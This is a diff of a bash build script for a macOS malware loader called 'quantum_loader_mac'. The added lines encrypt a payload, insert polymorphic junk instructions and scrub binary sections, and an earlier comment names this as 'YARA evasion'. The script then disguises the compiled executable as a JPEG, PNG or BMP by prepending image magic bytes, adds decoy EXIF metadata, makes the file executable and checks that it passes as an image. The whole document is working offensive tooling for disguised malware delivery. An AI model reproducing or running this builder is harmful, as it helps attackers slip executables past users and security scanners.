@@ -1,29 +1,65 @@
 #!/bin/bash
 set -e
 
-if [ $# -lt 5 ]; then
-    echo "Usage: $0 <image.jpg> <payload.bin> <base_key> <salt> <iv>"
+POLYGLOT=1
+EXIF=1
+IMAGE_FORMAT="jpg"
+
+usage() {
+    echo "Usage: $0 <output> <payload.bin> <base_key> <salt> <iv> [OPTIONS]"
+    echo ""
+    echo "Options:"
+    echo "  --no-polyglot      Build binary only, skip polyglot creation"
+    echo "  --no-exif          Skip EXIF metadata embedding"
+    echo "  --format <fmt>     Image format: jpg, png, bmp (default: jpg)"
+    echo "  --help             Show this help message"
     exit 1
+}
+
+if [ $# -lt 5 ]; then
+    usage
 fi
 
-IMAGE="$1"
+OUTPUT_FILE="$1"
 PAYLOAD="$2"
 BASE_KEY="$3"
 SALT="$4"
 IV="$5"
+shift 5
+
+while [ $# -gt 0 ]; do
+    case "$1" in
+        --no-polyglot)
+            POLYGLOT=0
+            ;;
+        --no-exif)
+            EXIF=0
+            ;;
+        --format)
+            shift
+            IMAGE_FORMAT="$1"
+            if [[ ! "$IMAGE_FORMAT" =~ ^(jpg|png|bmp)$ ]]; then
+                echo "Error: Invalid format. Use jpg, png, or bmp"
+                exit 1
+            fi
+            ;;
+        --help)
+            usage
+            ;;
+        *)
+            echo "Unknown option: $1"
+            usage
+            ;;
+    esac
+    shift
+done
+
 OUTPUT="quantum_loader_mac"
 TEMP_C="temp.c"
 
 # Generate junk.h
-echo "[*] Generating junk.h..."
-instructions=("nop" "mov %eax, %eax" "push %rax; pop %rax")
-count=$((RANDOM % 5 + 1))
-asm=""
-for ((i=0; i<count; i++)); do
-    idx=$((RANDOM % ${#instructions[@]}))
-    asm+="${instructions[idx]}; "
-done
-echo "#define JUNK_ASM asm volatile (\"$asm\")" > junk.h
+echo "[*] Generating polymorphic junk.h..."
+python3 generate_junk.py
 
 # Encrypt payload
 echo "[*] Encrypting payload..."
@@ -46,17 +82,75 @@ sed "s|__ENCRYPTED_PAYLOAD__|$ENC_PAYLOAD|" quantum_loader_mac.c \
 # Compile
 echo "[*] Compiling..."
 clang -Os -o "$OUTPUT" "$TEMP_C" -lcurl
-strip "$OUTPUT"
 
-# YARA evasion: Rename sections (basic approach)
-RANDOM_TEXT=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)
-otool -l "$OUTPUT" > /dev/null # Ensure compatibility; advanced renaming needs custom tools
+# Strip and scrub sections
+echo "[*] Scrubbing binary sections..."
+python3 scrub_sections.py "$OUTPUT" 2>/dev/null || (strip "$OUTPUT" && echo "[!] Section scrubbing skipped (lief not installed)")
 
-# Create JPEG polyglot
-echo -ne '\xff\xd8\xff\xe0' > "$IMAGE"
-cat "$OUTPUT" >> "$IMAGE"
-exiftool -overwrite_original -Model="QuantumMac" -Artist="Invisible" "$IMAGE" > /dev/null 2>&1
-chmod +x "$IMAGE"
+if [ $POLYGLOT -eq 1 ]; then
+    echo "[*] Creating polyglot image ($IMAGE_FORMAT)..."
+    
+    case "$IMAGE_FORMAT" in
+        jpg)
+            echo -ne '\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' > "$OUTPUT_FILE"
+            cat "$OUTPUT" >> "$OUTPUT_FILE"
+            ;;
+        png)
+            echo -ne '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a' > "$OUTPUT_FILE"
+            cat "$OUTPUT" >> "$OUTPUT_FILE"
+            ;;
+        bmp)
+            SIZE=$(stat -f%z "$OUTPUT")
+            TOTAL=$((54 + SIZE))
+            printf '\x42\x4d' > "$OUTPUT_FILE"
+            printf '\\x%02x\\x%02x\\x%02x\\x%02x' $(($TOTAL & 0xff)) $((($TOTAL >> 8) & 0xff)) $((($TOTAL >> 16) & 0xff)) $((($TOTAL >> 24) & 0xff)) >> "$OUTPUT_FILE"
+            printf '\x00\x00\x00\x00\x36\x00\x00\x00\x28\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x18\x00\x00\x00\x00\x00' >> "$OUTPUT_FILE"
+            cat "$OUTPUT" >> "$OUTPUT_FILE"
+            ;;
+    esac
+    
+    if [ $EXIF -eq 1 ] && command -v exiftool &> /dev/null; then
+        echo "[*] Embedding EXIF metadata..."
+        exiftool -overwrite_original -Model="QuantumMac" -Artist="InvisibleThread" -Comment="Secure Payload" "$OUTPUT_FILE" > /dev/null 2>&1 || echo "[!] EXIF embedding failed"
+    fi
+    
+    chmod +x "$OUTPUT_FILE"
+    
+    echo "[*] Validating polyglot integrity..."
+    case "$IMAGE_FORMAT" in
+        jpg)
+            if head -c 2 "$OUTPUT_FILE" | xxd -p | grep -q "ffd8"; then
+                echo "[✓] JPEG magic bytes verified"
+            else
+                echo "[!] Warning: JPEG magic bytes invalid"
+            fi
+            ;;
+        png)
+            if head -c 8 "$OUTPUT_FILE" | xxd -p | grep -q "89504e470d0a1a0a"; then
+                echo "[✓] PNG magic bytes verified"
+            else
+                echo "[!] Warning: PNG magic bytes invalid"
+            fi
+            ;;
+        bmp)
+            if head -c 2 "$OUTPUT_FILE" | xxd -p | grep -q "424d"; then
+                echo "[✓] BMP magic bytes verified"
+            else
+                echo "[!] Warning: BMP magic bytes invalid"
+            fi
+            ;;
+    esac
+    
+    if command -v file &> /dev/null; then
+        FILE_TYPE=$(file "$OUTPUT_FILE")
+        echo "[*] File type check: $FILE_TYPE"
+    fi
+    
+    echo "[✓] Polyglot complete: $OUTPUT_FILE"
+else
+    mv "$OUTPUT" "$OUTPUT_FILE"
+    chmod +x "$OUTPUT_FILE"
+    echo "[✓] Binary complete: $OUTPUT_FILE"
+fi
 
-echo "[✓] Payload complete: $IMAGE"
 rm -f "$TEMP_C" payload.enc junk.h "$OUTPUT"
